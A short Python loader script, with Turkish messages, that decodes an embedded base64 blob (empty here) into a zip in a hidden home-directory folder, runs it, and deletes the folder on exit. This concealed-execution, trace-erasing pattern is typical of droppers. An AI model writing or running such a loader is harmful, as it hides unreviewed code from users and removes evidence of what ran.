import os
try:
    import cython
except:
	os.system("pip install cython")
	import cython

import sys
import base64
import subprocess
import atexit

Bunny_HOME = os.path.expanduser("~")
Bunny_SHADOW = os.path.join(Bunny_HOME, ".Bunny_", "void")
Bunny_ZIP = os.path.join(Bunny_SHADOW, "Bunny.zip")

def Bunny_erase_trace():
    for _p in [Bunny_SHADOW, Bunny_ZIP]:
        if os.path.exists(_p):
            try:
                os.remove(_p) if os.path.isfile(_p) else __import__("shutil").rmtree(_p, True)
            except: pass

atexit.register(Bunny_erase_trace)

Bunny_VORTEX = """"""

try:
    Bunny_essence = base64.b64decode(Bunny_VORTEX)
except:
    sys.exit("Bunny_ bozuldu.")

os.makedirs(Bunny_SHADOW, exist_ok=True)

with open(Bunny_ZIP, "wb") as vault:
    vault.write(Bunny_essence)

try:
    subprocess.run(
        [sys.executable, Bunny_ZIP] + sys.argv[1:],
        cwd=Bunny_HOME,
        check=True,
        timeout=180,
        env=os.environ.copy()
    )
except subprocess.CalledProcessError as e:
    print(f"Bunny_ hata: {e.returncode}")
except subprocess.TimeoutExpired:
    print("Bunny_ zaman asimi")
except Exception as critical:
    print(f"Bunny_ karardi: {critical}")
